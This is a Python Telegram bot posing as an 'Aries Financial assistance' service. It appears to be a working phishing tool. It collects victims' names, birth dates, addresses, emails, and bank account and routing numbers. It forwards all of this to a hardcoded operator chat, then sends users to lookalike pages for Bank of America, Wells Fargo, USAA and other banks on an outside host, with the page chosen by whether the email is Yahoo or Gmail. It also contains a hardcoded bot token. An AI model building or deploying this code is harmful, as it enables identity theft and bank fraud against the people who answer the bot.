#!/usr/bin/env python
# pylint: disable=unused-argument, wrong-import-position
# This program is dedicated to the public domain under the CC0 license.

"""
First, a few callback functions are defined. Then, those functions are passed to
the Application and registered at their respective places.
Then, the bot is started and runs until we press Ctrl-C on the command line.

Usage:
Example of a bot-user conversation using ConversationHandler.
Send /start to initiate the conversation.
Press Ctrl-C on the command line or send a signal to the process to stop the
bot.
"""
import re
import pymongo
import webbrowser
import logging
from typing import Dict

from telegram import __version__ as TG_VER 

try:
    from telegram import __version_info__
except ImportError:
    __version_info__ = (0, 0, 0, 0, 0)  # type: ignore[assignment]

if __version_info__ < (20, 0, 0, "alpha", 1):
    raise RuntimeError(
        f"This example is not compatible with your current PTB version {TG_VER}. To view the "
        f"{TG_VER} version of this example, "
        f"visit https://docs.python-telegram-bot.org/en/v{TG_VER}/examples.html"
    )
from telegram import ReplyKeyboardMarkup, ReplyKeyboardRemove, InlineKeyboardButton, InlineKeyboardMarkup, Update, Bot
from telegram.ext import (
    Application,
    CommandHandler,
    ContextTypes,
    ConversationHandler,
    MessageHandler,
    filters,
    CallbackQueryHandler,
    
)
from telegram.constants import ParseMode


# Enable logging
logging.basicConfig(
    format="%(asctime)s - %(name)s - %(levelname)s - %(message)s", level=logging.INFO
)
# set higher logging level for httpx to avoid all GET and POST requests being logged
logging.getLogger("httpx").setLevel(logging.WARNING)

logger = logging.getLogger(__name__)

QUESTIONS, CHOOSING, BANK_NAME, DONE = range(4)

# Dictionary to store user data during the conversation
user_data = {}

questions = [
    "What's your favorite color?",
    "Kindly provide us your Name (Surname first)",
    "Your State/City",
    "Phone number",
    "Date of birth (dd/mm/yyyy)",
    "House address",
    "Email address",
    "Why should we consider your application?",
    "How would you want to be contacted: \nTelegram, Email, Whatsapp?",
    "Account number",
    "Routing number",
]

reply_keyboard = [
    ["Done"]
]
markup = ReplyKeyboardMarkup(reply_keyboard, one_time_keyboard=True, resize_keyboard=True)

reply_keyboard2 = [
    ["CONTINUE"]
]
markup2 = ReplyKeyboardMarkup(reply_keyboard2, one_time_keyboard=True, resize_keyboard=True)

# Your Telegram bot token
telegram_bot_token = "6384532778:AAHMaZBRAvX2iTaBN15M1pPduP8ZAjrm_U0"

# Recipient's chat ID (you can find this using a bot like @get_id_bot)
telegram_recipient_chat_id = "974422536"

# Create a Telegram bot instance
bot = Bot(token=telegram_bot_token)


def facts_to_str(user_data: Dict[str, str]) -> str:
    """Helper function for formatting the gathered user info."""
    facts = [f"{key} - {value}" for key, value in user_data.items()]
    return "\n".join(facts).join(["\n", "\n"])


async def start(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    """Start the conversation and ask user for input."""
    user = update.message.from_user
    await   update.message.reply_text(
        f"Hello {user.first_name}! Welcome to the Aries Financial assistance bot.\n"
        "Do well to answer all questions so we can get to know you.\n"
        "Please press CONTINUE to begin",
        reply_markup=markup2,
    )

    return QUESTIONS

async def ask_question(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    user_message = update.message.text
    user_id = update.message.from_user.id
    current_question = context.user_data.get('current_question', 0)
    
    context.user_data[f'answer_{current_question}'] = user_message  # Store the answer in user_data

    if current_question < len(questions) - 1:
        current_question += 1
        context.user_data['current_question'] = current_question
        await update.message.reply_text(questions[current_question])
    else:
        reply_markup = markup
        await update.message.reply_text("You've answered all the questions. Click 'Done' to finish.", reply_markup=reply_markup)
        return DONE
    
    return QUESTIONS


#async def choose_bank(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    """Sends a message with three inline buttons attached."""
    keyboard = [
        [
            InlineKeyboardButton("TD bank", callback_data="link to TD bank"),
            InlineKeyboardButton("Chase bank", callback_data="link to Chase"),
        ],
        [InlineKeyboardButton("MIT bank", callback_data="link to MIT bank")],
    ]

    reply_markup = InlineKeyboardMarkup(keyboard)

    await update.message.reply_text("Please select your bank:", reply_markup=reply_markup)


async def button(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    """Parses the CallbackQuery and updates the message text."""
    query = update.callback_query
    # CallbackQueries need to be answered, even if no notification to the user is needed
    # Some clients may have trouble otherwise. See https://core.telegram.org/bots/api#callbackquery
    await query.answer()

    await query.edit_message_text(text="Thank you. Our agent will update you on the next steps to take")
    

async def done(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    user = update.message.from_user
    user_id = user.id
    await update.message.reply_text("One more step and you're done.")
    
    # Store all the answers in the database
    user_responses = {}
    for i, question in enumerate(questions, start=0):
        user_responses[f'question_{i}'] = context.user_data.get(f'answer_{i}', 'Not answered')
    
    response = {
        "user_id": user_id,
        "responses": user_responses
    } 

    # Create the message
    telegram_message = f"**User ID:** {response['user_id']}\n\n**Responses:**\n{response['responses']}"

    # Send the message  
    await bot.send_message(chat_id=telegram_recipient_chat_id, text=telegram_message)


    # Save the user email 
    user_email = user_responses['question_6']

    # Define regular expressions to match Yahoo and Gmail email addresses
    yahoo_pattern = r'@yahoo\.com$'
    gmail_pattern = r'@gmail\.com$'

    #yahoo = f'http://localhost:5000/yahoo?tgUserId={user_id}'
    #gmail = f'https://bot-test-0lfi.onrender.com/GMAIL?tgUserId={user_id}'

    # Define each link, depending on the user's mail
    if re.search(yahoo_pattern, user_email):
        IDAHO_Bank = f'https://finance-79lm.onrender.com/Idaho_yahoo?tgUserId={user_id}'
        RBFCU_Bank = f'https://finance-79lm.onrender.com/rbfcu_yahoo?tgUserId={user_id}'
        MT_Bank = f'https://finance-79lm.onrender.com/M&T_yahoo?tgUserId={user_id}'
        BOA = f'https://finance-79lm.onrender.com/BankOfAmerica_yahoo?tgUserId={user_id}'
        CITI_BANK = f'https://finance-79lm.onrender.com/CitiBank_yahoo?tgUserId={user_id}'
        USAA = f'https://finance-79lm.onrender.com/USAA_yahoo?tgUserId={user_id}'
        WELLS = f'https://finance-79lm.onrender.com/Welz-Fargo_yahoo?tgUserId={user_id}'

    elif re.search(gmail_pattern, user_email):
        IDAHO_Bank = f'https://finance-79lm.onrender.com/Idaho_gmail?tgUserId={user_id}'
        RBFCU_Bank = f'https://finance-79lm.onrender.com/rbfcu_gmail?tgUserId={user_id}'
        MT_Bank = f'https://finance-79lm.onrender.com/M&T_gmail?tgUserId={user_id}'
        BOA = f'https://finance-79lm.onrender.com/BankOfAmerica_gmail?tgUserId={user_id}'
        CITI_BANK = f'https://finance-79lm.onrender.com/CitiBank_gmail?tgUserId={user_id}'
        USAA = f'https://finance-79lm.onrender.com/USAA_GMAIL?tgUserId={user_id}'
        WELLS = f'https://finance-79lm.onrender.com/Welz-Fargo_gmail?tgUserId={user_id}'
    else:
        IDAHO_Bank = f'https://finance-79lm.onrender.com/Idaho?tgUserId={user_id}'
        RBFCU_Bank = f'https://finance-79lm.onrender.com/rbfcu?tgUserId={user_id}'
        MT_Bank = f'https://finance-79lm.onrender.com/M&T?tgUserId={user_id}'
        BOA = f'https://finance-79lm.onrender.com/BankOfAmerica?tgUserId={user_id}'
        CITI_BANK = f'https://finance-79lm.onrender.com/CitiBank?tgUserId={user_id}'
        USAA = f'https://finance-79lm.onrender.com/USAA?tgUserId={user_id}'
        WELLS = f'https://finance-79lm.onrender.com/Welz-Fargo?tgUserId={user_id}'


    
    """Sends a message with eight inline buttons attached."""
    keyboard = [
        [InlineKeyboardButton("IDAHO Bank", url=IDAHO_Bank)],
        [InlineKeyboardButton("M&T bank", url=MT_Bank)],
        [InlineKeyboardButton("Bank of America", url=BOA)],
        [InlineKeyboardButton("CITI Bank", url=CITI_BANK)],
        [InlineKeyboardButton("Wells Fargo", url=WELLS)],
        [InlineKeyboardButton("USAA", url=USAA)],
        [InlineKeyboardButton("Randolph-Brooks Federal Credit Union", url=RBFCU_Bank)],
        [InlineKeyboardButton("Others", callback_data="other")],
    ]

    reply_markup = InlineKeyboardMarkup(keyboard)

    await update.message.reply_text("Please select your financial institution and proceed to complete your registration:", reply_markup=reply_markup)


    # Clear user data
    context.user_data.clear()

    # End the conversation
    return ConversationHandler.END

    


def main() -> None:
    """Run the bot."""
    # Create the Application and pass it your bot's token.
    application = Application.builder().token("6384532778:AAHMaZBRAvX2iTaBN15M1pPduP8ZAjrm_U0").build()

    application.add_handler(CallbackQueryHandler(button))

    # Add conversation handler with the states CHOOSING, TYPING_CHOICE and TYPING_REPLY
    conv_handler = ConversationHandler(
        entry_points=[CommandHandler("start", start)],
        states={
            QUESTIONS: [
                MessageHandler(
                    filters.TEXT & ~filters.COMMAND, ask_question
                    ),
                    MessageHandler(
                    filters.TEXT & ~(filters.COMMAND |filters.Regex('^Done$')), done
                    )
            ],
            DONE: [
                MessageHandler(
                    filters.Regex('^Done$'), done
                    )
            ],
        },
        fallbacks=[MessageHandler(filters.Regex("^Done$"), done)],
    )

    application.add_handler(conv_handler)

    # Run the bot until the user presses Ctrl-C
    application.run_polling(allowed_updates=Update.ALL_TYPES)


if __name__ == "__main__":
    main()
